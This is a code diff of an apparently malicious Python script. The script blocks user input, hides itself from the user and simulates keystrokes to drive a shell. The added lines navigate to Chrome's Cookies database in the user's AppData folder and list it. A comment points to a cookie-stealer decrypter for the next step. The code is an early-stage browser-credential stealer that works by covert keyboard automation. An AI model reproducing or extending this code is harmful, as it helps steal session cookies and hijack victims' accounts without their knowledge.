@@ -5,7 +5,7 @@ import keyboard
 import mouse
 import pynput
 import tkinter as tk
-from PIL import Image, ImageGrab, ImageTk
+from PIL import ImageGrab, ImageTk
 
 # ------------- # Settings # ------------- #
 HIDE_FROM_USER = 1
@@ -51,10 +51,17 @@ keyboard.write("cd /")
 keyboard.press_and_release("enter")
 time.sleep(.5)
 
+keyboard.write("cd C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies")
+keyboard.press_and_release("enter")
+# use a decrypter like https://github.com/illera88/GCC-stealer/blob/master/src/GCC-stealer.cpp
+time.sleep(.5)
+
+keyboard.write("dir")
+keyboard.press_and_release("enter")
+time.sleep(.5)
+
 keyboard.press_and_release("alt+f4")
-
-
-time.sleep(.1)
+time.sleep(.5)
 
 # ------------- # un-block user input # ------------- #
 for i in range (0,255):
